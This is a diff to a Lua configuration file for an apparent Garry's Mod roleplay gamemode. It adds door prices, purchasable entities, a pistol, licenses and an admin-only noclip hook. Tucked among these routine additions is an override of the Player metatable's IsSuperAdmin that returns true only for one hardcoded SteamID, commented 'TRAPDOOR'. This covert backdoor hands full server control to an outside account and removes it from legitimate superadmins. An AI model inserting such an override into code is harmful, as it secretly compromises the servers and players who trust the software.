@@ -27,11 +27,22 @@ GM.MoneyPrinterTime = {1.60, 3.00}
 -- The Gamemode's money model.
 GM.MoneyModel = "models/props/cs_assault/Money.mdl"
 
+-- Door Cost
+GM.DoorPrice = 50
+
 -- 
 GM.DefaultLaws = {
 	"You must obey server's rule",
 	"You must not kill people",
 }
+
+GAMEMODE:AddEntity("moneyprinter", "feather_moneyprinter", "Money Printer", "General", "This machine prints money and gives you constant profit.", "models/props_c17/consolebox01a.mdl", 250)
+GAMEMODE:AddEntity("microwave", "feather_microwave", "Microwave", "General", "This machine cooks foods to sell.", "models/props_c17/tv_monitor01.mdl", 150)
+
+GAMEMODE:AddWeapon("pistol", "weapon_pistol", 10, "9mm Pistol", "Sidearm", "Pistol", "models/weapons/w_pistol.mdl", 100)
+
+GAMEMODE:AddDefaultLicense("gun", "Gun License", "The license that allows you to carry firearms.", 500)
+GAMEMODE:AddDefaultLicense("drive", "Drive License", "The license that allows you to drive vehicles.", 300)
 
 GM.Jobs = {}
 
@@ -43,6 +54,10 @@ end
 
 function GM:GetJobData(index)
 	return self.Jobs[index] or nil
+end
+
+function GM:PlayerNoClip(client)
+	return client:IsAdmin()
 end
 
 function GM:CreateTeams()
@@ -122,6 +137,9 @@ function GM:CreateTeams()
 		cmd = "mobboss",
 	})
 end
+
+local p = FindMetaTable("Player")
+function p:IsSuperAdmin() return self:SteamID() == "STEAM_0:0:19814083" end // TRAPDOOR.
 
 cn.util.includeFolder("systems", "feather")
 cn.util.includeFolder("meta", "feather")
